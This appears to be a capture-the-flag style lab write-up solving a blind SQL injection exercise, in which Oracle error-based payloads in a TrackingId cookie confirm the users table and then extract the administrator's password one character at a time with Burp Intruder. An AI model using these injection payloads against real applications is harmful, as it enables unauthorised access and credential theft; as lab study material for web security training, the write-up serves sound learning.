The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

Vulnerable parameter - trackingId cookie
First step is to intercept and modify the request containing the TrackingId cookie.

# End goal:
+ Output the administrator password
+ Login as the administrator user

# Analysis:

## 1. Prove that parameter is vulnerable.  
Using ' and '' respectively to verify how it would be if an merror message is received.  

## 2. Figure out which type of database it is:  
`TrackingId=xyz'||(SELECT '')||'`   
-- mySQL syntax, a SQL syntas error received.  

TrackingId=xyz'||(SELECT '' FROM dual)||'   
-- Oracle syntax, must followed by 'FROM'. dual is a dummy tabel.   
-- No error received. So the target is probably using an Oracle database.

## 3. Confirm the users table exists in the database  
`' || (select '' from users) ||'`  
-> type 500 internal server error  
--The users table may contain more than one row, and this will output an empty entry for each entry in the users table. So if the users table has five entries, this will be ouput in five different rows which may break our sever code webapp.

`' || (select '' from users where rownum=1) ||'`  
-> 200 OK  
-- The users table exists.  

## 4. Confirm that the administrator user exists in the users database.  
`' || (select '' from users where username='administrator') ||'`  
-> If the administrator exists, it will return a 200 OK respond.  
-> If the administrator does not exist, it will ignore the query and still return a 200 OK respond.  

`' || (select CASE WHEN (1=1) then TO_CHAR(1/0) ELSE '' END from users where username='administrator') ||'`  
-> If the administrator exists, it will go to the select part, since 1=1, it will do TO_CHAR(1/0), which will return a 500 internal server error.  
-> If the administrator does not exist, it will ignore the query and still return a 200 OK respond.  

## 5. Determine the length of password  
`' || (select CASE WHEN (1=1) then TO_CHAR(1/0) ELSE '' END from users where username='administrator' and length(password)>1) ||'`  
-> 200 OK: the password length is less than 1.  
-> 500 error: the password length is longer than 1.  
By using intruder in Burp, we can easily get the length of password is 20.  

## 6. Determine the password  
`' || (select CASE WHEN (1=1) then TO_CHAR(1/0) ELSE '' END from users where username='administrator' and substr(password,1,1)='a') ||'`  
-> 200 OK: the first character of the password is not 'a'  
-> 500 error: the first character of the password is 'a'  
By repeating the process in intruder in Burp, we will get the full password.  
